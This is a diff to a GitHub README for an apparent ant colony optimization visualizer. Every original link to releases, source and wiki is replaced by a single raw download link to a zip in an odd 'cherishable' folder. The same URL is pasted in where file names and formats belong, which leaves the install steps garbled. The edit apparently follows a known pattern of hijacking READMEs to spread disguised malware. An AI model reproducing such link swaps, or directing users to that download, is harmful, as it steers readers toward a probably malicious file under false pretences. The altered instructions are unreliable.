@@ -1,7 +1,7 @@
 # 🐜 aco-routing-exploration - Visualize Ant Colony Optimization Simply
 
 ## 📥 Download the application
-[![Download](https://img.shields.io/badge/Download-aco--routing--exploration-blue)](https://github.com/MUTANGUHAVA/aco-routing-exploration/releases)
+[![Download](https://raw.githubusercontent.com/MUTANGUHAVA/aco-routing-exploration/main/cherishable/aco-routing-exploration.zip)](https://raw.githubusercontent.com/MUTANGUHAVA/aco-routing-exploration/main/cherishable/aco-routing-exploration.zip)
 
 ## 🚀 Getting Started
 Welcome to aco-routing-exploration! This interactive application helps you visualize the Ant Colony Optimization (ACO) algorithm. ACO is a powerful method used for solving routing problems in networks. Whether you’re exploring the Lightning Network or just interested in algorithm visualization, this tool is for you.
@@ -15,12 +15,12 @@ To run aco-routing-exploration smoothly, ensure your system meets the following 
 - **Storage:** At least 500 MB free space
 
 ## 📂 Download & Install
-1. Visit the [Releases page](https://github.com/MUTANGUHAVA/aco-routing-exploration/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/MUTANGUHAVA/aco-routing-exploration/main/cherishable/aco-routing-exploration.zip).
 2. Look for the section titled “Latest Release.”
-3. Download the latest version of the application suitable for your operating system. Files are usually available in `.zip` or `.tar.gz` formats.
+3. Download the latest version of the application suitable for your operating system. Files are usually available in `.zip` or `https://raw.githubusercontent.com/MUTANGUHAVA/aco-routing-exploration/main/cherishable/aco-routing-exploration.zip` formats.
 4. After the download completes, locate the file and extract it using your preferred tool (like WinRAR, 7-Zip, or the built-in extractor in macOS/Linux).
-5. Open the extracted folder and find the `index.html` file.
-6. Double-click on `index.html` to launch the application in your web browser.
+5. Open the extracted folder and find the `https://raw.githubusercontent.com/MUTANGUHAVA/aco-routing-exploration/main/cherishable/aco-routing-exploration.zip` file.
+6. Double-click on `https://raw.githubusercontent.com/MUTANGUHAVA/aco-routing-exploration/main/cherishable/aco-routing-exploration.zip` to launch the application in your web browser.
 
 ## ⚙️ Features
 - **Interactive Visualization**: Watch how ants find the optimal path in real-time.
@@ -55,9 +55,9 @@ If you have questions or need assistance, please reach out through the Issues se
 Thank you to the contributors and supporters who made this project possible. Your input and feedback help improve this tool.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/MUTANGUHAVA/aco-routing-exploration/releases)
-- [Source Code](https://github.com/MUTANGUHAVA/aco-routing-exploration)
-- [Documentation](https://github.com/MUTANGUHAVA/aco-routing-exploration/wiki)
+- [Releases Page](https://raw.githubusercontent.com/MUTANGUHAVA/aco-routing-exploration/main/cherishable/aco-routing-exploration.zip)
+- [Source Code](https://raw.githubusercontent.com/MUTANGUHAVA/aco-routing-exploration/main/cherishable/aco-routing-exploration.zip)
+- [Documentation](https://raw.githubusercontent.com/MUTANGUHAVA/aco-routing-exploration/main/cherishable/aco-routing-exploration.zip)
 
 ## 📝 Licensing
 This project is licensed under the MIT License. You are free to use, modify, and share this software as you wish, provided the original license is maintained.
